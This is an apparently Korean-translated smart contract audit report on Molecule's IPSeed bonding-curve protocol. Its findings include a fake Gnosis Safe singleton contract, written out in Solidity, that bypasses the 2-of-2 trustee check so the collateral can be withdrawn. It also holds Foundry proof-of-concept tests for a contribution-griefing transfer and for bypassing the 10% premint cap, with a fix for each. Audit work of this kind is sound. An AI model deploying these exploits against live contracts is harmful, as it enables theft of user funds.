# 정보 (About)

Pashov Audit Group은 업계 최고의 스마트 계약 보안 연구원들로 구성된 여러 팀으로 이루어져 있습니다. 총 1000개 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 여정을 만들기 위해 노력합니다. 100% 보안을 보장할 수는 없지만, 경험 많은 연구원들이 귀하의 블록체인 프로토콜을 위해 최선을 다할 것을 보장합니다. [여기](https://github.com/pashov/audits)에서 이전 작업을 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 연락해 주세요.

# 면책 조항 (Disclaimer)

스마트 계약 보안 검토는 취약점의 완벽한 부재를 보장할 수 없습니다. 이는 시간, 리소스 및 전문 지식이 제한된 노력으로, 가능한 한 많은 취약점을 찾으려고 노력합니다. 검토 후 100% 보안을 보장하거나 검토가 스마트 계약의 모든 문제를 발견할 것이라고 보장할 수 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 소개 (Introduction)

**moleculeprotocol/desci-ecosystem** 저장소에 대한 시간 제한 보안 검토가 **Pashov Audit Group**에 의해 수행되었으며, 애플리케이션의 스마트 계약 구현의 보안 측면에 중점을 두었습니다.

# Catalyst 소개 (About Catalyst)

이 프로토콜을 통해 사용자는 새로운 ERC1155 토큰을 출시하여 프로젝트를 생성할 수 있습니다. 각 프로젝트마다 고유하게 구성할 수 있는 가격 본딩 커브(bonding curve)에서 다양한 프로젝트를 구매하고 판매할 수 있습니다. 각 커브 거래에는 거래 수수료가 발생합니다.

# 위험 분류 (Risk Classification)

| 심각도 | 영향: 높음 | 영향: 중간 | 영향: 낮음 |
| --- | --- | --- | --- |
| **가능성: 높음** | 치명적 (Critical) | 높음 (High) | 중간 (Medium) |
| **가능성: 중간** | 높음 (High) | 중간 (Medium) | 낮음 (Low) |
| **가능성: 낮음** | 중간 (Medium) | 낮음 (Low) | 낮음 (Low) |

## 영향 (Impact)

- 높음 (High) - 프로토콜 자산의 상당한 물질적 손실을 초래하거나 사용자 그룹에 심각한 피해를 줍니다.

- 중간 (Medium) - 프로토콜 자산의 적당한 물질적 손실을 초래하거나 사용자 그룹에 중간 정도의 피해를 줍니다.

- 낮음 (Low) - 프로토콜 자산의 경미한 물질적 손실을 초래하거나 소규모 사용자 그룹에 피해를 줍니다.

## 가능성 (Likelihood)

- 높음 (High) - 온체인 조건을 모방한 합리적인 가정하에 공격 경로가 가능하며, 공격 비용이 훔치거나 잃을 수 있는 자금의 양에 비해 상대적으로 낮습니다.

- 중간 (Medium) - 조건부로 동기가 부여된 공격 벡터이지만 여전히 상대적으로 가능성이 높습니다.

- 낮음 (Low) - 가정이 너무 많거나 희박하거나 인센티브가 거의 없거나 전혀 없는 공격자의 상당한 지분을 필요로 합니다.

## 심각도 수준에 따른 조치 (Action required for severity levels)

- 치명적 (Critical) - 가능한 한 빨리 수정해야 함 (이미 배포된 경우)

- 높음 (High) - 수정해야 함 (아직 배포되지 않은 경우 배포 전)

- 중간 (Medium) - 수정하는 것이 좋음

- 낮음 (Low) - 수정할 수 있음

# 보안 평가 요약 (Security Assessment Summary)

_검토 커밋 해시_ - [ed869fb84c764232fceda77732def7db8d315f4d](https://github.com/moleculeprotocol/desci-ecosystem/tree/ed869fb84c764232fceda77732def7db8d315f4d)

_수정 검토 커밋 해시_ - [57e66c94c3537d1673e359549e7fc477be48782e](https://github.com/moleculeprotocol/desci-ecosystem/tree/57e66c94c3537d1673e359549e7fc477be48782e)

### 범위 (Scope)

다음 스마트 계약들이 감사 범위에 포함되었습니다:

- `LinearCurve`
- `SafeIPSeedTrust`
- `IPSeed`
- `IPSeedTrust`

# 발견 사항 (Findings)

# [C-01] 담보 및 수수료 인출과 신뢰 안전 메커니즘 우회

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

프로젝트 사양에서:

        각 프로젝트에는 다음 상태 동안 매우 특별한 권리를 누리는 전용 수혜자 주소가 연결되어 있으므로 서명자 2명과 2/2 임계값(threshold)이 있는 (Safe) 다중 서명 지갑이 되도록 강제됩니다:
        sourcer: 프로젝트를 생성한 사용자, 시장 생성 매개변수에 정의된 대로 중간-높은 신뢰 당사자
        protocolTrustee: 구성된 IPSeedTrust 계약에 설정된 프로토콜 제어 지갑 및 높은 신뢰 당사자(molecule).

IPSeedTrust 계약은 `protocolTrustee`가 소유자이고 임계값이 2로 설정되어 있는지 확인함으로써 소서(sourcer)와 프로토콜 수탁자(protocol trustee) 모두가 토큰 인출 트랜잭션(예: `claimCollateral` 및 `projectSucceeded`)에 서명해야 함을 보장하도록 설계되었습니다.

```solidity
  function checkIfBeneficiaryIsATrustedSafe(address beneficiary) public view {
    if (protocolTrustee == address(0)) {
      return; //when no trustee is configured, we're not checking for Safe accounts
    }
    IOwnerManager ownerManager = IOwnerManager(beneficiary);

    if (
      beneficiary.codehash != SAFE_PROXY_130_CODEHASH || ownerManager.getThreshold() != 2 // @audit check codehash = SAFE_PROXY_130_CODEHASH not ensure the Gnosis Safe is trusted.
        || ownerManager.getOwners().length != 2 || !ownerManager.isOwner(protocolTrustee)
    ) {
      revert BeneficiaryIsNotTrustful();
    }
  }
```

그러나 현재 구현에서는 수혜자의 codehash를 Safe Proxy 계약 v1.3.0의 codehash에 대해서만 검증합니다. Safe 싱글톤(singleton) 자체가 합법적인 v1.3.0 계약인지 확인하지 않습니다. 이러한 간과로 인해 악의적인 행위자가 의도된 보안 확인을 우회하여 사기성 싱글톤으로 Safe 계약을 배포할 수 있습니다. 결과적으로 악의적인 행위자는 수혜자 Safe에 대한 제어권을 가정하고 프로토콜 수탁자의 승인 없이 토큰 인출 트랜잭션을 실행할 수 있습니다.

예를 들어, 악의적인 싱글톤은 `protocolTrustee` 소유권 상태를 시뮬레이션하여 2명 서명자 요구 사항을 충족하는 척하며 `isOwner` 검사가 `protocolTrustee`에 대해 항상 true를 반환하도록 오도할 수 있습니다.

```solidity
contract MaliciousGnosisSafe is GnosisSafe {
    address public fakeOwner;
    address public realOwner;

    function setReturnOwner(address _fakeOwner, address _realOwner) public {
        fakeOwner = _fakeOwner;
        realOwner = _realOwner;
    }

    function getOwners() public view override returns (address[] memory) {
        address[] memory array = new address[](2);
        array[0] = fakeOwner;
        array[1] = realOwner;
        return array;
    }

    function getThreshold() public view override returns (uint256) {
        return 2;
    }

    function isOwner(address owner) public view override returns (bool) {
        if (owner == fakeOwner) {
            return true;
        } else {
            return super.isOwner(owner);
        }
    }
}
```

설정 및 POC:

- POC 파일 MaliciousGenosisSafe.t.sol을 test/MaliciousGenosisSafe.t.sol에 넣습니다.
  https://gist.github.com/thangtranth/701abaf86864510967fbacc7dbe79eba

- GnosisSafe.sol (MaliciousGnosisSafe 싱글톤)을 test/helpers/GnosisSafe.sol에 넣습니다.
  https://gist.github.com/thangtranth/4fba8229778254d59c18a2e740239ad8

- ISafeProxyFactory.sol을 test/helpers/ISafeProxyFactory.sol에 넣습니다.
  https://gist.github.com/thangtranth/20edd2cbbcb7afb73dd0a6c13a771448

`forge test -vvvvv --match-path test/MaliciousGenosisSafe.t.sol --match-test testPOC` 실행

## 권장 사항

이 취약점을 완화하려면 싱글톤의 진위 검증을 보장하십시오:

- 프록시의 슬롯(slot) 0을 읽고 오프체인에서 확인하여 싱글톤이 허용된 목록에 없는 경우 사용자에게 경고합니다.
- 계약 내에서:

```diff
+  interface ISafe {
+     function getStorageAt(uint256, uint256) external view returns (bytes memory);
+  }
+
+  address SAFE_SINGLETON_CONTRACT = 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552;
+
   function checkIfBeneficiaryIsATrustedSafe(address beneficiary) public view {
     if (protocolTrustee == address(0)) {
       return; //when no trustee is configured, we're not checking for Safe accounts
     }
     IOwnerManager ownerManager = IOwnerManager(beneficiary);

+   bytes memory data = ISafe(beneficiary).getStorageAt(0, 1);
+   address singletonAddress;
+
+   assembly {
+        singletonAddress := mload(add(data, 32))
+   }

-   if (
+   if ( singletonAddress != SAFE_SINGLETON_CONTRACT ||
       beneficiary.codehash != SAFE_PROXY_130_CODEHASH || ownerManager.getThreshold() != 2
         || ownerManager.getOwners().length != 2 || !ownerManager.isOwner(protocolTrustee)
     ) {
       revert BeneficiaryIsNotTrustful();
     }
   }
```

# [H-01] 시장 사전 발행(pre-mint)이 `p`보다 작은 경우 발행(mint)이 깨짐

## 심각도

**영향:** 중간 (Medium)

**가능성:** 높음 (High)

## 설명

시장이 생성될 때 `params.premint`와 `params.curveParameters` 내부에 구성된 `p`가 다른 것이 허용됩니다. 단, `params.premint`가 더 낮고 `getBuyPrice`에 제공될 때 0이 되어야 합니다.

```solidity
  function checkParameters(MarketParameters memory params) public view virtual {
    if (!trustedCurves[address(params.priceCurve)]) {
      revert UntrustedCurve();
    }

    // reverts if parameters are out of sanity range
    params.priceCurve.checkParameters(params.curveParameters, params.fundingGoal);

    //the "premint" parameter can be different from the curve's premint parameter
    if (params.priceCurve.getBuyPrice(0, params.premint, params.curveParameters) != 0) {
      revert ParameterMismatch();
    }

    // check that the deadline isn't too far in the future (eg millisecond issues)
    if (params.deadline > block.timestamp + 10 * 365 days) {
      revert ParameterMismatch();
    }
  }
```

그러나 mint가 호출되면 `params.premint`에 대해 확인하는데, 이는 올바르지 않으며 실제 `p` 매개변수가 `params.premint`보다 큰 경우 문제가 발생합니다.

```solidity
  function mint(uint256 tokenId, uint256 amount)
    external
    payable
    nonReentrant
    returns (uint256 gross, uint256 net, uint256 tokensToMint)
  {
    MarketData storage market = markets[tokenId];
    if (market.state != MarketState.OPEN) {
      revert BadState(MarketState.OPEN, market.state);
    }

    MarketParameters memory _marketParams = marketParams[tokenId];

    if (trySettle(tokenId) > MarketState.OPEN) {
      //this allows settling the market implicitly without reverting
      Address.sendValue(payable(_msgSender()), msg.value);
      return (0, 0, 0);
    }

    uint256 tradingFee;
    //when buying, gross > net
    (gross, net, tradingFee) = getBuyPrice(tokenId, amount);

    // revert trades that require too low volume but still allow premints that require 0 value
    if (
      totalSupply(tokenId) + amount > _marketParams.premint // @audit - premint here can be lower than the actual `p`
        && (amount < MINIMUM_TRADE_SIZE || net == 0)
    ) {
      revert TradeSizeOutOfRange();
    }
   // ...
}
```

커브 매개변수 내부의 실제 `p`에서 무료 사전 발행의 나머지 부분만 발행하려는 사용자는 net이 0이 되기 때문에 항상 되돌려집니다(revert).

## 권장 사항

`_marketParams.premint` 대신 커브 매개변수의 `p`를 확인하는 것을 고려하십시오.

```diff
+  (, uint256 p) = _marketParams.priceCurve.decodeParameters(_marketParams.curveParameters);
    if (
-      totalSupply(tokenId) + amount > _marketParams.premint
+      totalSupply(tokenId) + amount > p
        && (amount < MINIMUM_TRADE_SIZE || net == 0)
    ) {
      revert TradeSizeOutOfRange();
    }
```
# [M-01] 공급량(supply)이 사전 발행(premint) 매개변수보다 작으면 되돌리기(revert)

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`getTokensNeededToAddEthValue` 함수는 `supply`가 `curve`의 `premint` 매개변수보다 작으면 되돌려집니다.

```
function getTokensNeededToAddEthValue(uint256 supply, uint256 ethAmount, bytes32 curveParameters) external pure returns (uint256 tokenAmount) {
    (uint256 m, uint256 p) = decodeParameters(curveParameters);
    UD60x18 pmins = ud(supply - p);
}
```

`supply`가 `curve`의 `premint` 매개변수보다 작은 시나리오를 설명하겠습니다.

`Market Parameters`의 `premint` 매개변수는 다양한 목적을 위해 `curve`의 `premint` 매개변수보다 낮을 수 있습니다.
우리는 아래 주석에서 이것을 알 수 있습니다.

```
function checkParameters(MarketParameters memory params) public view virtual {
    //the "premint" parameter can be different from the curve's premint parameter
    if (params.priceCurve.getBuyPrice(0, params.premint, params.curveParameters) != 0) {
      revert ParameterMismatch();
    }
}
```

새 프로젝트를 생성(spawn)할 때 초기 토큰은 `sourcer`에게 발행되고 `total supply`는 `Market Parameters`의 `premint`가 됩니다.

```
function spawn(MarketParameters memory params) external nonReentrant {
    _mint(params.sourcer, params.tokenId, params.premint, "");
}
```

첫 번째 `minter`가 `funding goal`을 커버할 만큼 충분한 토큰을 발행하려는 경우, 이에 필요한 토큰 양이 계산됩니다.
그러나 현재 `total supply`가 `curve`의 `premint` 매개변수보다 작기 때문에 트랜잭션이 되돌려집니다.

```
function mint(uint256 tokenId, uint256 amount)
    external
    payable
    nonReentrant
    returns (uint256 gross, uint256 net, uint256 tokensToMint)
{
    if (market.collateral + net > _marketParams.fundingGoal) {
       tokensToMint = _marketParams.priceCurve.getTokensNeededToAddEthValue(
          totalSupply(tokenId),
          _marketParams.fundingGoal - market.collateral,
          _marketParams.curveParameters
        );
    }
}
```

## 권장 사항

아래와 같이 `getTokensNeededToAddEthValue` 함수를 업데이트하십시오:

```diff
function getTokensNeededToAddEthValue(uint256 supply, uint256 ethAmount, bytes32 curveParameters)
    external
    pure
    returns (uint256 tokenAmount)
{
    (uint256 m, uint256 p) = decodeParameters(curveParameters);
-     UD60x18 pmins = ud(supply - p);
+     UD60x18 pmins = ud(supply > p ? supply - p : 0);
    UD60x18 _m = ud(m);
    UD60x18 rootTerm = _m.mul(_m.mul(pmins.mul(pmins)).add(ud(2 * ethAmount)));
    UD60x18 result = (rootTerm.sqrt()).div(_m).ceil();
-     tokenAmount = result.intoUint256() + p - supply;
+     tokenAmount = result.intoUint256() - pmins;
}
```

# [M-02] 기여도(contribution) 전송 없이 기부하기

## 심각도

**영향:** 낮음 (Low)

**가능성:** 높음 (High)

## 설명

프로젝트가 최소한 `FUNDED` 상태에 도달하면 시드 토큰을 누구나 양도할 수 있게 되며, 기여금 양은 전송된 토큰 양에 비례하여 이전됩니다.

```solidity
  function _update(address from, address to, uint256[] memory ids, uint256[] memory values)
    internal
    virtual
    override
  {
    if (from != address(0) && to != address(0)) {
      uint256 transferLength = ids.length;
      for (uint256 i; i < transferLength; ++i) {
        MarketData memory market = markets[ids[i]];
        if ((market.state < MarketState.FUNDED) && from != marketParams[ids[i]].sourcer) {
          revert TransferRestricted();
        }
>>>     uint256 transferContribution =
          values[i] * contributions[ids[i]][from] / balanceOf(from, ids[i]);
        contributions[ids[i]][from] -= transferContribution;
        contributions[ids[i]][to] += transferContribution;
        emit ContributionTransferred(ids[i], from, to, transferContribution);
      }
    }
    super._update(from, to, ids, values);
  }
```

그러나 반올림 오류로 인해 `values[i] * contributions[ids[i]][from]`이 `balanceOf(from, ids[i])`보다 낮으면 방해자(griefer)가 기여도를 전송하지 않고 시드 토큰을 다른 사람에게 전송할 수 있습니다.

이것은 문제를 일으킬 수 있습니다. 시장이 `FUNDED` 상태에 도달하고 사용자 A가 토큰의 일부를 다른 사용자 B에게 전송하려고 하는 시나리오를 고려하십시오. 전송이 발생하기 전에 방해자가 시드 토큰을 사용자 A에게 전송합니다. 잔액이 증가했다는 사실을 모른 채 사용자 A는 토큰의 일부를 사용자 B에게 전송합니다. 그러나 사용자 A의 잔액 증가로 인해 사용자 B가 받는 기여금 양은 원래 받아야 할 금액보다 적게 됩니다.

코드화된 PoC:

```solidity
  function testTransferGriefContributions() public {
     (uint256 tokenId,) = defaultMarket(ophelia);

    userMint(alice, tokenId, 2000 ether);
    userMint(bob, tokenId, 3000 ether);
    userMint(charlie, tokenId, 5001 ether);

    uint256 alicesContribution = ipSeed.contributions(tokenId, alice);
    uint256 aliceBalance = ipSeed.balanceOf(alice, tokenId);
    uint256 halfAliceBalanceInitial = aliceBalance / 2;
    uint256 expectedTransferedContribution = halfAliceBalanceInitial * alicesContribution / aliceBalance;
    console.log("alice contribution before :");
    console.log(alicesContribution);
    console.log("alice balance before :");
    console.log(aliceBalance);

    //charlie donate to alice but not tranferring contribution
    uint256[] memory ids = new uint256[](200);
    uint256[] memory amounts = new uint256[](200);
    for (uint i; i < 200; i++) {
       ids[i] = tokenId;
       amounts[i] = 600;
    }
    vm.startPrank(charlie);
    ipSeed.safeBatchTransferFrom(charlie, alice, ids, amounts, "");
    vm.stopPrank();

    assertEq(alicesContribution, ipSeed.contributions(tokenId, alice));

    console.log("alice contribution after :");
    console.log(ipSeed.contributions(tokenId, alice));
    console.log("alice balance after :");
    console.log(ipSeed.balanceOf(alice, tokenId));

    uint256 bobContributionBefore = ipSeed.contributions(tokenId, bob);

    // alice transfer half of token amount before donation from charlie
    vm.startPrank(alice);
    ipSeed.safeTransferFrom(alice, bob, tokenId, halfAliceBalanceInitial, "");
    vm.stopPrank();

    uint256 receivedContribution = ipSeed.contributions(tokenId, bob) - bobContributionBefore;

    console.log("expected contribution : ");
    console.log(expectedTransferedContribution);
    console.log("transferred contribution after donation : ");
    console.log(receivedContribution);

  }
```

테스트 출력:

```shell
  expected contribution :
  204060810121000000
  transferred contribution after donation :
  204060810120999987
```

동일한 양의 토큰에 대해 받은 기여금이 예상보다 적다는 것을 알 수 있습니다.

## 권장 사항

`_update` 내부에서 `contributions` 값이 0이 아닐 때 전송된 기여금이 0이 아니어야 하는지 확인하십시오.

# [M-03] 10% 최대 사전 발행(pre-mint) 확인을 우회할 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

사용자가 시장을 생성할 때 `LinearCurve.checkParameters`를 통해 제공된 구성이 올바른지 확인해야 합니다. `m`은 미리 정의된 범위 내에 있어야 하며 `p`(반전 발행) 양은 총공급량의 10%를 초과해서는 안 됩니다.

```solidity
  function checkParameters(bytes32 curveParameters, uint256 fundingGoal) external pure override {
    (uint256 m, uint256 p) = decodeParameters(curveParameters);
    if ((m < 1e4) || (m >= 1e19)) {
      revert CurveParametersOutOfRange();
    }

    uint256 fundingGoalInTokens = supplyAtCollateral(curveParameters, fundingGoal);

    //shouldnt allow more than 10% premints
    if (((100 * p) / fundingGoalInTokens) > 10) {
      revert CurveParametersOutOfRange();
    }
  }
```

`supplyAtCollateral`은 제공된 공식, 매개변수 및 담보 금액을 사용하여 시드 토큰의 양을 계산합니다. 그런 다음 `(100 * p)` / `fundingGoalInTokens`의 결과가 10을 초과하지 않는지 확인합니다. 그러나 특정 구성에서는 정밀도 손실로 인해 이를 우회할 수 있습니다.

PoC :

테스트 계약에 이 단위 테스트를 추가하십시오:

```solidity
    function testPreMintExceed10Percent() public {
      uint256 slope = curve.computeSlope(10 ether, 9000 ether, 990 ether);
      uint256 fundingGoalInTokens =
      curve.supplyAtCollateral(bytes32(abi.encodePacked(uint128(slope), uint128(990 ether))), 10 ether);

      (uint256 tokenId,) = defaultMarket(ophelia);

      userMint(alice, tokenId, 9000 ether);


      MarketData memory _marketData = ipSeed.getMarketData(tokenId);

      console.log("market collateral collected : ");
      console.log(_marketData.collateral);

      console.log("supplyAtCollateral result : ");
      console.log(fundingGoalInTokens);
      assertTrue(_marketData.state == MarketState.FUNDED);
    }
```

`DefaultParams`를 다음과 같이 수정하십시오:

```solidity
  function defaultParams(uint256 tokenId, address sourcer, address beneficiary, LinearCurve curve)
    public
    view
    returns (MarketParameters memory params)
  {
    uint256 slope = curve.computeSlope(10 ether, 9000 ether, 990 ether);

    params = MarketParameters({
      tokenId: tokenId,
      projectId: projectId,
      sourcer: sourcer,
      beneficiary: beneficiary,
      priceCurve: curve,
      curveParameters: bytes32(abi.encodePacked(uint128(slope), uint128(990 ether))),
      fundingGoal: 10 ether,
      premint: 990 ether,
      deadline: uint64(block.timestamp + defaultDeadline)
    });
  }
```

테스트에서 사전 발행된 발행량은 상한선인 10% 대신 11%(추가 90 * 1e18 양의 시드 토큰)가 됩니다.

## 권장 사항

백분율을 확인할 때 정밀도를 높여 정밀도 손실을 최소화하십시오.

```diff
-    if (((100 * p) / fundingGoalInTokens) > 10) {
+    if (((10000 * p) / fundingGoalInTokens) > 1000) {
       revert CurveParametersOutOfRange();
     }
```

또 다른 수정 옵션:

```diff
  function checkParameters(bytes32 curveParameters, uint256 fundingGoal) external view override {
    ...
    uint256 fundingGoalInTokens = supplyAtCollateral(curveParameters, fundingGoal);

    //shouldnt allow more than 10% premints
-   if (((100 * p) / fundingGoalInTokens) > 10) {
+   if ((100 * p) > 10 * fundingGoalInTokens) {
       revert CurveParametersOutOfRange();
     }
  }
```

# [L-01] 의견 불일치가 있는 경우 담보가 반환되지 않음

협상이 실패하면 수혜자는 `negotiationFailed` 함수를 호출하여 담보를 반환할 수 있습니다. 이 함수에는 `onlyBeneficiary` 수정자가 있어 수혜자만 이 함수를 호출할 수 있습니다. 그러나 수혜자가 임계값(threshold)이 2인 Gnosis Safe 다중 서명 지갑이고 소서(sourcer)가 담보 반환에 동의하지 않아 사실상 "인질"로 잡는 경우 담보를 정당하게 반환할 수 없습니다. 이러한 교착 상태는 그러한 트랜잭션의 실행이 소서와 프로토콜 수탁자 모두의 서명을 요구하기 때문에 발생합니다.

```solidity
  function negotiationFailed(uint256 tokenId)
    external
    payable
    nonReentrant
    onlyBeneficiary(tokenId) // @audit Need both sourcer and prtocol trustee to sign
  {
    ...
  }
```

# [L-02] 모든 환불이 이루어진 후 남은 먼지(Dust) 금액

시장이 만료되면 `refund` 함수는 자금 조달 목표에 대한 사용자의 기여도를 기반으로 환불 금액을 계산합니다. 환불 금액은 사용자의 기여금을 발생 자본(accrued capital)으로 나누고 청구 가능 자본(claimable capital)을 곱하여 계산합니다. 결과는 내림되며, 이로 인해 모든 환불이 이루어진 후 계약에 먼지 금액이 남을 수 있습니다.

총 청구된 기여금과 총 환불된 지급금을 추적하여 이를 피할 수 있습니다. 총 청구된 기여금이 `accruedCapital`과 같으면 마지막 환불임을 의미하며 남은 청구 가능 자본(claimableCapital - 총 환불된 지급금)을 마지막 사용자에게 환불할 수 있습니다.

```solidity
  function refund(uint256 tokenId, address contributor, uint16 feeBps)
    private
    returns (uint256 payout, uint256 tradingFee)
  {
    uint256 contribution = contributions[tokenId][contributor];
    MarketData storage market = markets[tokenId];
    //in an open market users simply get their contribution back
    //in expired markets they receive a share of the claimable collateral proportional to their original contribution to the funding goal
    if (market.state > MarketState.OPEN) {
      payout = (contribution * market.claimableCapital) / market.accruedCapital; // @audit result is rounded down
    } else {
    ...
  }
```

그러나 먼지 금액은 무시할 수 있으므로 영향은 매우 작습니다.
